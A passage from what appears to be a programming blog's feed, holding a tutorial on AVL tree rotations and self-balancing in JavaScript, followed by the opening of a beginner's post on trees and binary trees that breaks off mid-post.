<figure class="highlight js"><figcaption><span>swapParentChild</span><a href="https://github.com/amejiarosario/algorithms.js/blob/master/src/data-structures/trees/tree-rotations.js" target="_blank" rel="noopener">Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">swapParentChild</span>(<span class="params">oldChild, newChild, parent</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (parent) &#123;</span><br><span class="line">    <span class="keyword">const</span> side = oldChild.isParentRightChild ? <span class="string">'right'</span> : <span class="string">'left'</span>;</span><br><span class="line">    <span class="comment">// this set parent child AND also</span></span><br><span class="line">    parent[side] = newChild;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// no parent? so set it to null</span></span><br><span class="line">    newChild.parent = <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>We are using this function to make <code>1</code> the parent of <code>3</code>. We are going to use it rotation right as well.</p>
<h2 id="Right-Rotation">Right Rotation<a href="#Right-Rotation" class="headerlink" title="Right Rotation"></a></h2><p>We have the following tree with descending values <code>4-3-2-1</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">      4                                        4</span><br><span class="line">     /                                        /</span><br><span class="line">    3*                                       2</span><br><span class="line">   /                                        /  \</span><br><span class="line">  2       ---| right-rotation(3) |--&gt;      1    3*</span><br><span class="line"> /</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<p>To perform a right rotation on node <code>3</code> we move it down as its child <code>2</code>‚Äòs <strong>right</strong> descendatnt.</p>
<img src="/images/right-rotation2.gif" title="Left rotate on 2">
<p>This is called <strong>single right rotation</strong> or <strong>Right-Right (RR) rotation</strong>.</p>
<p>The code is pretty similar to what we did on the left rotation:</p>
<figure class="highlight js"><figcaption><span>rightRotation</span><a href="https://github.com/amejiarosario/algorithms.js/blob/master/src/data-structures/trees/tree-rotations.js" target="_blank" rel="noopener">Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rightRotation</span>(<span class="params">node</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> newParent = node.left;</span><br><span class="line">  <span class="keyword">const</span> grandparent = node.parent;</span><br><span class="line"></span><br><span class="line marked">  swapParentChild(node, newParent, grandparent);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// do RR rotation</span></span><br><span class="line marked">  newParent.right = node;</span><br><span class="line marked">  node.left = <span class="literal">undefined</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> newParent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>The <code>rightRotation</code> does the following:</p>
<ol>
<li>First, we swap <code>4</code>‚Äòs child: before it was <code>3</code> and after the swap is <code>2</code> (line 5).</li>
<li>Later, we make <code>3</code> the <strong>right</strong> child of 2 (line 8) and</li>
<li>Finally, we clean up the <code>3</code> right child reference to null (line 9).</li>
</ol>
<p>Now that know how single rotations work to the left and right we can combine them: left-right and right-left rotations.</p>
<h2 id="Left-Right-Rotation">Left-Right Rotation<a href="#Left-Right-Rotation" class="headerlink" title="Left-Right Rotation"></a></h2><p>If we insert values on a BST in this order: 3-1-2. We will get an unbalanced tree. In order to balance the tree we have to do a <code>leftRightRotation(3)</code>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  3*                                       2*</span><br><span class="line"> /                                        /  \</span><br><span class="line">1    --| left-right-rotation(3) |-&gt;      1    3</span><br><span class="line"> \</span><br><span class="line">  2</span><br></pre></td></tr></table></figure>
<p>Double rotations are a combination of the other two rotations we discussed in (LL and RR):</p>
<p>If we expand the <code>left-right-rotation</code> into the two single rotations we would have:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  3*                          3*</span><br><span class="line"> /                          /                            2</span><br><span class="line">1   -left-rotation(1)-&gt;    2    -right-rotation(3)-&gt;    /  \</span><br><span class="line"> \                        /                            1    3*</span><br><span class="line">  2                      1</span><br></pre></td></tr></table></figure>
<ul>
<li>left-rotation(1): We do a left rotation on the nodes‚Äô left child. E.g. <code>1</code></li>
<li>right-rotation(3): right rotation on the same node. E.g. <code>3</code></li>
</ul>
<img src="/images/left-right-rotation.gif" title="Left-Right rotate on 2">
<p>This is double rotation called <strong>Left-Right (LR) rotation</strong>.</p>
<figure class="highlight js"><figcaption><span>leftRightRotation</span><a href="https://github.com/amejiarosario/algorithms.js/blob/master/src/data-structures/trees/tree-rotations.js" target="_blank" rel="noopener">Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leftRightRotation</span>(<span class="params">node</span>) </span>&#123;</span><br><span class="line">  leftRotation(node.left);</span><br><span class="line">  <span class="keyword">return</span> rightRotation(node);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>The code is very simple since we leverage the <code>leftRotation</code> and <code>rightRotation</code> that we did before.</p>
<h2 id="Right-Left-Rotation">Right-Left Rotation<a href="#Right-Left-Rotation" class="headerlink" title="Right-Left Rotation"></a></h2><p>When we insert nodes on the following order: <code>1-3-2</code>, we need to perform a <code>rightLeftRotation(1)</code> to balance the tree.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1*                           1*</span><br><span class="line"> \                            \                              2</span><br><span class="line">   3   -right-rotation(3)-&gt;    2   -left-rotation(1)-&gt;      /  \</span><br><span class="line"> /                              \                          1*   3</span><br><span class="line">2                                3</span><br></pre></td></tr></table></figure>
<p>The code to is very similar to LR rotation:</p>
<figure class="highlight js"><figcaption><span>leftRightRotation</span><a href="https://github.com/amejiarosario/algorithms.js/blob/master/src/data-structures/trees/tree-rotations.js" target="_blank" rel="noopener">Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rightLeftRotation</span>(<span class="params">node</span>) </span>&#123;</span><br><span class="line">  rightRotation(node.right);</span><br><span class="line">  <span class="keyword">return</span> leftRotation(node);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>We know all the rotations needed to balanced any binary tree. Let‚Äôs go ahead an use the AVL algorithm to keep it balanced on insertions/deletions.</p>
<h1 id="AVL-Tree-Overview">AVL Tree Overview<a href="#AVL-Tree-Overview" class="headerlink" title="AVL Tree Overview"></a></h1><p><strong>AVL Tree</strong> was the first self-balanced tree invented. It is named after the two inventors <strong>A</strong>delson-<strong>V</strong>elsky and <strong>L</strong>andis. In their self-balancing algorithm if one subtree differs from the other by at most one then rebalancing is done using rotations.</p>
<p>We already know how to do rotations from the previous sections, the next step is to figure out the subtree‚Äôs heights. We are going to call <strong>balance factor</strong>, the diff between the left and right subtree on a given node.</p>
<blockquote>
<p>balanceFactor = leftSubtreeHeight - rightSubtreeHeight</p>
</blockquote>
<p>If the balance factor is bigger than <code>1</code> or less than <code>-1</code> then, we know we need to balance that node. We can write the balance function as follows:</p>
<figure class="highlight js"><figcaption><span>Balance</span><a href="https://github.com/amejiarosario/algorithms.js/blob/master/src/data-structures/trees/tree-rotations.js#L98" target="_blank" rel="noopener">Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">balance</span>(<span class="params">node</span>) </span>&#123;</span><br><span class="line marked">  <span class="keyword">if</span> (node.balanceFactor &gt; <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// left subtree is higher than right subtree</span></span><br><span class="line">    <span class="keyword">if</span> (node.left.balanceFactor &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      rightRotation(node);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (node.left.balanceFactor &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      leftRightRotation(node);</span><br><span class="line">    &#125;</span><br><span class="line marked">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (node.balanceFactor &lt; <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="comment">// right subtree is higher than left subtree</span></span><br><span class="line">    <span class="keyword">if</span> (node.right.balanceFactor &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      leftRotation(node);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (node.right.balanceFactor &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      rightLeftRotation(node);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Based on the balance factor there 4 different rotation that we can do: RR, LL, RL, and LR. To know what rotation to do we:</p>
<ol>
<li>Take a look into the given <code>node</code>‚Äòs <code>balanceFactor</code>.</li>
<li>If balance factor is <code>-1</code>, <code>0</code> or <code>1</code> we are done.</li>
<li>If the node needs balancing, then we use the node‚Äôs left or right balance factor to tell which kind of rotation it needs.</li>
</ol>
<p>Notice that we haven‚Äôt implemented the <code>node.balanceFactor</code>  attribute yet, but we are going to do that next.</p>
<p>One of the easiest ways to implement subtree heights is using recursion. Let‚Äôs go ahead and add height-related properties to <code>TreeNode</code> class:</p>
<figure class="highlight js"><figcaption><span>height, leftSubtreeHeight and rightSubtreeHeight</span><a href="https://github.com/amejiarosario/algorithms.js/blob/master/src/data-structures/trees/tree-node.js#L125" target="_blank" rel="noopener">Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">get height() &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Math</span>.max(<span class="keyword">this</span>.leftSubtreeHeight, <span class="keyword">this</span>.rightSubtreeHeight);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">get leftSubtreeHeight() &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.left ? <span class="keyword">this</span>.left.height + <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">get rightSubtreeHeight() &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.right ? <span class="keyword">this</span>.right.height + <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">get balanceFactor() &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.leftSubtreeHeight - <span class="keyword">this</span>.rightSubtreeHeight;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>To understand better what‚Äôs going on let‚Äôs do some examples.</p>
<h2 id="Tree-with-1-node">Tree with 1 node<a href="#Tree-with-1-node" class="headerlink" title="Tree with 1 node"></a></h2><p>Let‚Äôs start with a single root node</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  40*</span><br><span class="line">/     \</span><br></pre></td></tr></table></figure>
<ul>
<li>Since this node doesn‚Äôt have left nor right children then <code>leftSubtreeHeight</code> and <code>rightSubtreeHeight</code> will return <code>0</code>.</li>
<li>Height is <code>Math.max(this.leftSubtreeHeight, this.rightSubtreeHeight)</code> which is  <code>Math.max(0, 0)</code>, so height is <code>0</code>.</li>
<li>Balance factor is also zero since <code>0 - 0 = 0</code>.</li>
</ul>
<h2 id="Tree-with-multiple-nodes">Tree with multiple nodes<a href="#Tree-with-multiple-nodes" class="headerlink" title="Tree with multiple nodes"></a></h2><p>Let‚Äôs try with multiple nodes</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">     40</span><br><span class="line">   /   \</span><br><span class="line">  35    60</span><br><span class="line"> /     /</span><br><span class="line">25    50</span><br><span class="line">     /</span><br><span class="line">    45</span><br></pre></td></tr></table></figure>
<p><strong>balanceFactor(45)</strong></p>
<ul>
<li>As we saw leaf nodes doesn‚Äôt have left or right subtree so their heights are 0, thus balance factor is 0.</li>
</ul>
<p><strong>balanceFactor(50)</strong></p>
<ul>
<li><code>leftSubtreeHeight = 1</code> and <code>rightSubtreeHeight = 0</code>.</li>
<li><code>height = Math.max(1, 0)</code>, so it‚Äôs <code>1</code>.</li>
<li>Balance factor is <code>1 - 0</code>, so it‚Äôs <code>1</code> as well.</li>
</ul>
<p><strong>balanceFactor(60)</strong></p>
<ul>
<li><code>leftSubtreeHeight = 2</code> and <code>rightSubtreeHeight = 0</code>.</li>
<li><code>height = Math.max(2, 0)</code>, so it‚Äôs <code>2</code>.</li>
<li>Balance factor is <code>2 - 0</code>, so it‚Äôs <code>2</code> and it‚Äôs UNBALANCED!</li>
</ul>
<p>If we use our <code>balance</code> function on node <code>60</code> that we developed, then it would do a <code>rightRotation</code> on <code>60</code> and the tree will look like:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">     40</span><br><span class="line">   /   \</span><br><span class="line">  35    50</span><br><span class="line"> /     /   \</span><br><span class="line">25    45    60*</span><br></pre></td></tr></table></figure>
<p>Before the height of the tree (from the root) was 3, now it‚Äôs only 2.</p>
<p>Let‚Äôs put all together and explain how we can keep a binary search tree balanced on insertion and deletion.</p>
<h1 id="AVL-Tree-Insertion-and-Deletion">AVL Tree Insertion and Deletion<a href="#AVL-Tree-Insertion-and-Deletion" class="headerlink" title="AVL Tree Insertion and Deletion"></a></h1><p>AVL tree is just a layer on top of a regular Binary Search Tree (BST). The add/remove operations are the same as in the BST, the only difference is that we run the <code>balance</code> function after each operation.</p>
<p>Let‚Äôs implement the AVL Tree.</p>
<figure class="highlight js"><figcaption><span>AvlTree</span><a href="https://github.com/amejiarosario/algorithms.js/blob/master/src/data-structures/trees/avl-tree.js" target="_blank" rel="noopener">Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> BinarySearchTree = <span class="built_in">require</span>(<span class="string">'./binary-search-tree'</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; balanceUptream &#125; = <span class="built_in">require</span>(<span class="string">'./tree-rotations'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AvlTree</span> <span class="keyword">extends</span> <span class="title">BinarySearchTree</span> </span>&#123;</span><br><span class="line">  add(value) &#123;</span><br><span class="line">    <span class="keyword">const</span> node = <span class="keyword">super</span>.add(value);</span><br><span class="line marked">    balanceUptream(node);</span><br><span class="line">    <span class="keyword">return</span> node;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  remove(value) &#123;</span><br><span class="line">    <span class="keyword">const</span> node = <span class="keyword">super</span>.find(value);</span><br><span class="line">    <span class="keyword">if</span> (node) &#123;</span><br><span class="line">      <span class="keyword">const</span> found = <span class="keyword">super</span>.remove(value);</span><br><span class="line marked">      balanceUptream(node.parent);</span><br><span class="line">      <span class="keyword">return</span> found;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>If you need to review the dependencies here are the links to the implementations:</p>
<ul>
<li><a href="https://github.com/amejiarosario/algorithms.js/blob/master/src/data-structures/trees/binary-search-tree.js" target="_blank" rel="noopener">binary-search-tree</a></li>
<li><a href="https://github.com/amejiarosario/algorithms.js/blob/master/src/data-structures/trees/tree-rotations.js" target="_blank" rel="noopener">tree-rotations</a></li>
</ul>
<p>The <code>balanceUpstream</code> function gets executed after an insertion or deletion.</p>
<figure class="highlight js"><figcaption><span>balanceUptream</span><a href="https://github.com/amejiarosario/algorithms.js/blob/master/src/data-structures/trees/tree-rotations.js#L121" target="_blank" rel="noopener">Context</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">balanceUptream</span>(<span class="params">node</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> current = node;</span><br><span class="line">  <span class="keyword">while</span> (current) &#123;</span><br><span class="line marked">    balance(current);</span><br><span class="line">    current = current.parent;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>We go recursively using the <code>balance</code> function on the nodes‚Äô parent until we reach the root node.</p>
<p>In the following animation we can see AVL tree insertions and deletions in action:</p>
<img src="/images/avl-tree-insert-remove.gif" title="AVL tree insertions and deletions">
<p>You can also check the
<a href="https://github.com/amejiarosario/algorithms.js/blob/master/src/data-structures/trees/avl-tree.spec.js" target="_blank" rel="noopener">test files</a>
to see more detailed examples of how to use the AVL trees.</p>
<p>That‚Äôs all folks!</p>
<!-- --- -->
<!-- Perfect binary trees (when every level is full of nodes) are always balanced because their height is the lowest possible given the number of nodes. -->
<!-- \`|~ log_2 (n + 1) ~|\` -->
<!-- or -->
<!-- *`Math.ceil( Math.log2(n  + 1) )`*, where *`n`* is the total number of nodes. -->
<!-- However, perfect binary trees are not very common in the real world. We just want to gurantee a search time of *`O(log n)`*. Relaxing a little bit the definition we can say that -->
<h1 id="Summary">Summary<a href="#Summary" class="headerlink" title="Summary"></a></h1><p>In this post, we explored the AVL tree which is an a special binary search tree that self-balance itself after insertions and deletions of nodes. The operations of balancing a tree involves rotations and they can be single or double rotations.</p>
<p>Single rotations:</p>
<ul>
<li>Left rotation</li>
<li>Right rotation</li>
</ul>
<p>Double rotations:</p>
<ul>
<li>Left-Right rotation</li>
<li>Right-Left rotation</li>
</ul>
<p>You can find all the code developed here in the
<a href="https://github.com/amejiarosario/algorithms.js/tree/master/src/data-structures/trees" target="_blank" rel="noopener">Github</a>.
You can <code>star</code> it to keep it handy.</p>
]]></content>
    
    <summary type="html">
    
      &lt;script type=&quot;text/javascript&quot; src=&quot;https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML&quot; async&gt;&lt;/script&gt;


&lt;p&gt;Binary Search Trees are used for many things that we might not be aware of. For instance: Website‚Äôs databases use trees to search data more efficiently. HTML DOM elements are represented as a tree. For trees to be effective they need to be balanced. So, we are going to discuss how to keep the BST balanced as you add and remove elements.&lt;/p&gt;
    
    </summary>
    
      <category term="Programming" scheme="https://adrianmejia.com/categories/Programming/"/>
    
      <category term="Data Structures and Algorithms (DSA)" scheme="https://adrianmejia.com/categories/Programming/Data-Structures-and-Algorithms-DSA/"/>
    
    
      <category term="big-o notation" scheme="https://adrianmejia.com/tags/big-o-notation/"/>
    
      <category term="algorithms" scheme="https://adrianmejia.com/tags/algorithms/"/>
    
      <category term="tutorial_algorithms" scheme="https://adrianmejia.com/tags/tutorial-algorithms/"/>
    
  </entry>
  
  <entry>
    <title>Tree Data Structures for Beginners</title>
    <link href="https://adrianmejia.com/blog/2018/06/11/Data-Structures-for-Beginners-Trees-binary-search-tree-tutorial/"/>
    <id>https://adrianmejia.com/blog/2018/06/11/Data-Structures-for-Beginners-Trees-binary-search-tree-tutorial/</id>
    <published>2018-06-11T22:49:30.000Z</published>
    <updated>2018-06-11T22:49:30.000Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML" async></script>

<p>Tree data structures are the base for other data structure like Maps and Sets. Also, used on databases performed quick searches. The HTML DOM uses a tree data structure to represents the hierachy of elements. These are some to name a few. In this post, we are going to explore the different types of trees like a binary tree, binary search trees and how to implement them.</p>
<a id="more"></a>
<p>In the <a href="/blog/2018/05/14/Data-Structures-for-Beginners-Graphs-Time-Complexity-tutorial/">previous post</a>, we explored the Graph data structures which are a generalized case of trees. Let‚Äôs get started learning what tree data structures are!</p>
<hr>
<p>This post is part of a tutorial series:</p>
<p><strong>Learning Data Structures and Algorithms (DSA) for Beginners</strong></p>
<ol>
<li><p><a href="/blog/2018/04/04/how-you-can-change-the-world-learning-data-structures-algorithms-free-online-course-tutorial/">Intro to algorithm‚Äôs time complexity and Big O notation</a></p>
<!-- 1. Intro to Algorithm's Time Complexity and Big O Notation **üëà you are here** -->
</li>
<li><p><a href="/blog/2018/04/05/most-popular-algorithms-time-complexity-every-programmer-should-know-free-online-tutorial-course/">Eight time complexities that every programmer should know</a></p>
<!-- 1. Eight time complexities that every programmer should know **üëà you are here** -->
</li>
<li><p><a href="/blog/2018/04/28/Data-Structures-Time-Complexity-for-Beginners-Arrays-HashMaps-Linked-Lists-Stacks-Queues-tutorial/">Data Structures for Beginners: Arrays, HashMaps, and Lists</a></p>
<!-- 1. Data Structures for Beginners: Arrays, HashMaps, and Lists **üëà you are here** -->
</li>
<li><p><a href="/blog/2018/05/14/Data-Structures-for-Beginners-Graphs-Time-Complexity-tutorial/">Graph Data Structures for Beginners</a></p>
<!-- 1. Graph Data Structures for Beginners **üëà you are here** -->
</li>
<li><p>Trees Data Structures for Beginners <strong>üëà you are here</strong></p>
<!-- 1. [Trees Data Structures for Beginners](/blog/2018/06/11/Data-Structures-for-Beginners-Trees-binary-search-tree-tutorial/) -->
</li>
<li><p><a href="/blog/2018/07/16/self-balanced-binary-search-trees-with-avl-tree-data-structure-for-beginners/">Self-balanced Binary Search Trees</a></p>
<!-- 1. Self-balanced Binary Search Trees  **üëà you are here** -->
</li>
<li><p><a href="/blog/2018/04/24/Analysis-of-Recursive-Algorithms/">Appendix I: Analysis of Recursive Algorithms</a></p>
</li>
</ol>
<hr>
<h1 id="Trees-basic-concepts">Trees: basic concepts<a href="#Trees-basic-concepts" class="headerlink" title="Trees: basic concepts"></a></h1><p>A tree is a data structure where a node can zero or more children. Each node contains a <strong>value</strong>. Like graphs, the connection between nodes is called <strong>edges</strong>. A tree is a type of graph, but not all graphs are trees (only the acyclic undirected graph are trees).</p>
<p>They are called ‚Äútrees‚Äù because the data structure resembles a tree üå≥. It starts with a <strong>root</strong> node and <strong>branch</strong> off with its descendants, and finally, there are <strong>leaves</strong>.</p>
<!-- { img https://www.tutorialspoint.com/data_structures_algorithms/images/binary_tree.jpg Tree } -->
<!-- { img http://www.i-programmer.info/images/stories/BabBag/trees/Tree1.jpg Tree elements } -->
<img src="/images/tree-parts.jpg">
<p>Here are some properties of trees:</p>
<ul>
<li>The top-most node is called <strong>root</strong>.</li>
<li>A node without children is called <strong>leaf</strong> node or <strong>terminal</strong> node.</li>
<li><strong>Height</strong> (<em>h</em>) of the tree is the distance (edge count) between the farthest leaf to the root.<ul>
<li><code>A</code> has a height of 3</li>
<li><code>I</code> has a height of 0</li>
</ul>
</li>
<li><strong>Depth</strong> or <strong>level</strong> of a node is the distance between the root and the node in question.<ul>
<li><code>H</code> has a depth of 2</li>
<li><code>B</code> has a depth of 1</li>
</ul>
</li>
</ul>
<h2 id="Implementing-a-simple-tree-data-structure">Implementing a simple tree data structure<a href="#Implementing-a-simple-tree-data-structure" class="headerlink" title="Implementing a simple tree data structure"></a></h2><p>As we saw earlier, a tree node is just a data structure that has a value and has links to their descendants.</p>
<p>Here‚Äôs an example of a tree node:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(value) &#123;</span><br><span class="line">    <span class="keyword">this</span>.value = value;</span><br><span class="line">    <span class="keyword">this</span>.descendents = [];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>We can create a tree with 3 descendents as follows:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// create nodes with values</span></span><br><span class="line"><span class="keyword">const</span> abe = <span class="keyword">new</span> TreeNode(<span class="string">'Abe'</span>);</span><br><span class="line"><span class="keyword">const</span> homer = <span class="keyword">new</span> TreeNode(<span class="string">'Homer'</span>);</span><br><span class="line"><span class="keyword">const</span> bart = <span class="keyword">new</span> TreeNode(<span class="string">'Bart'</span>);</span><br><span class="line"><span class="keyword">const</span> lisa = <span class="keyword">new</span> TreeNode(<span class="string">'Lisa'</span>);</span><br><span class="line"><span class="keyword">const</span> maggie = <span class="keyword">new</span> TreeNode(<span class="string">'Maggie'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// associate root with is descendents</span></span><br><span class="line">abe.descendents.push(homer);</span><br><span class="line">homer.descendents.push(bart, lisa, maggie);</span><br></pre></td></tr></table></figure>
<p>That‚Äôs all; we have a tree data structure!</p>
<img src="/images/simpson2-tree.jpg" title="Simpson tree data structure">
<p>The node <code>abe</code> is the <strong>root</strong> and <code>bart</code>, <code>lisa</code> and <code>maggie</code> are the <strong>leaf</strong> nodes of the tree. Notice that tree‚Äôs node can have a different number of descendants: 0, 1, 3 or any number.</p>
<h1 id="Binary-Trees">Binary Trees<a href="#Binary-Trees" class="headerlink" title="Binary Trees"></a></h1><p>Trees nodes can have zero or more children. However, when a tree has at the most 2 children, then it‚Äôs called <strong>binary tree</strong>.</p>
<p>A binary tree is one of the most common forms of trees and has many applications such as:</p>
<!-- - Searching in a time complexity of *O(log n)*. -->
<!-- - Cryptography: [Generate pseudorandom numbers](https://www.cs.princeton.edu/courses/archive/fall07/cos433/prf_goldreich.pdf) -->
<ul>
<li><a href="https://adrianmejia.com/blog/2018/04/28/data-structures-time-complexity-for-beginners-arrays-hashmaps-linked-lists-stacks-queues-tutorial/#HashMaps">Maps</a></li>
<li><a href="https://adrianmejia.com/blog/2018/04/28/data-structures-time-complexity-for-beginners-arrays-hashmaps-linked-lists-stacks-queues-tutorial/#Sets">Sets</a></li>
<li>Databases</li>
<li>Priority Queues</li>
<li>Querying an LDAP (Lightweight Directory Access Protocol)</li>
<li>Searching through an XML/HTML file using the Document Object Model (DOM) interface.</li>
</ul>
<h2 id="Full-Complete-and-Perfect-binary-trees">Full, Complete and Perfect binary trees<a href="#Full-Complete-and-Perfect-binary-trees" class="headerlink" title="Full, Complete and Perfect binary trees"></a></h2><p>Depending on how nodes are arranged in a binary tree, it can be <strong>full</strong>, <strong>complete</strong> and <strong>perfect</strong>:</p>
<ul>
<li><strong>Full binary tree</strong>: each node has exactly 0 or 2 children (but never 1).</li>
<li><strong>Complete binary tree</strong>: when all levels except the last one are <strong>full</strong> with nodes.</li>
<li><strong>Perfect binary tree</strong>: when all the levels (including the last one) are full of nodes.</li>
</ul>
<!-- If each node has only two children (left and right), we call it **Binary Tree**. -->
<!-- A binary tree where every node has 0 or 2 children then it said to be a **full binary tree** -->
<!-- When a binary is perfect and comple, it is called a **Perfect Binary Tree**. -->
